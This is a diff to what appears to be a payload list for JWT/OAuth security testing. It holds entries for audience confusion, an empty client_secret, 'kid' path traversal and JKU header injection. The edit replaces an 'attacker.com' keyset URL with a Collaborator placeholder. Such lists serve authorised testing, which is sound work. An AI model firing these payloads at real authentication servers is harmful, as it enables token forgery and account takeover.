@@ -74,7 +74,7 @@
         {"payload": "{\"aud\": [\"client_a\", \"client_b\"]}", "description": "Multi-audience token — cross-client confusion", "waf_bypass": false},
         {"payload": "client_id=VALID_CLIENT&client_secret=", "description": "Empty client_secret — test if secret validation enforced", "waf_bypass": false},
         {"payload": "{\"kid\": \"../../attacker-key\"}", "description": "Key ID path traversal to load attacker JWK", "waf_bypass": true},
-        {"payload": "{\"jku\": \"https://attacker.com/jwks.json\"}", "description": "JKU header injection — load attacker keyset", "waf_bypass": true}
+        {"payload": "{\"jku\": \"https://COLLABORATOR_URL/jwks.json\"}", "description": "JKU header injection — Collaborator interaction confirms server fetches keyset; full bypass requires hosting matching JWKS", "waf_bypass": true}
       ]
     }
   }
